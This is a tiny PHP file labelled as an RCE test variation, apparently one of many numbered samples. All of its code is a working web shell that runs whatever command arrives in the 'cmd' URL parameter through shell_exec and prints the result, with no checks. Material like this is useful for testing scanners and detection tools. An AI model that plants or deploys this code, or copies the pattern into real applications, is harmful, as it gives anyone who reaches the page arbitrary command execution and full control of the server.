<?php
// RCE test variation #598
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>